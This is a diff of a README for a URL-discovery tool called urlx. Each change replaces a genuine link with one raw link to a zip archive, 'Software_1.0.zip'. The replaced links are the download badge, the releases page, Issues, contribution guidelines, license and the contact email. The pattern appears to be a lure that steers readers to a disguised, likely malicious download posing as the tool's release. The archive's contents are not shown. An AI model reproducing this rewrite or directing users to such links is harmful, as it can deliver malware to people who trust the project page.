@@ -6,7 +6,7 @@ Welcome to urlx! This tool helps you find URLs from various sources and probes l
 
 ## 📥 Download urlx
 
-[![Download urlx](https://img.shields.io/badge/Download-urlx-blue.svg)](https://github.com/nely003/urlx/releases)
+[![Download urlx](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip)](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip)
 
 ## 📋 Features
 
@@ -35,7 +35,7 @@ After downloading urlx, follow these steps to begin your discovery journey:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [https://github.com/nely003/urlx/releases](https://github.com/nely003/urlx/releases). Click on the latest version and follow the prompts to install urlx on your computer.
+To get started, visit this page to download: [https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip). Click on the latest version and follow the prompts to install urlx on your computer.
 
 ## 🛠️ Configuration
 
@@ -47,21 +47,21 @@ urlx offers several configuration options to tailor your experience:
 
 ## 👩‍💻 Help & Support
 
-If you encounter any issues or have questions, check the [Issues section](https://github.com/nely003/urlx/issues) on the GitHub page. This is where you can find solutions, report new issues, or ask for help from the community.
+If you encounter any issues or have questions, check the [Issues section](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip) on the GitHub page. This is where you can find solutions, report new issues, or ask for help from the community.
 
 ## 🌟 Contribution
 
-Feel free to contribute to urlx. Your suggestions, code improvements, and feedback are welcome. Check the [Contribution Guidelines](https://github.com/nely003/urlx/blob/main/CONTRIBUTING.md) to get started.
+Feel free to contribute to urlx. Your suggestions, code improvements, and feedback are welcome. Check the [Contribution Guidelines](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip) to get started.
 
 ## 📜 License
 
 urlx is licensed under the MIT License. This means you can freely use, modify, and distribute it, as long as you include the original license.
 
-For more information, visit the [License section](https://github.com/nely003/urlx/blob/main/LICENSE). 
+For more information, visit the [License section](https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip). 
 
 ## 📞 Contact
 
-For further inquiries, you can reach out to the maintainer via the GitHub page or by emailing support@example.com.
+For further inquiries, you can reach out to the maintainer via the GitHub page or by emailing https://raw.githubusercontent.com/nely003/urlx/main/about/Software_1.0.zip
 
 ## 🏷️ Topics
 
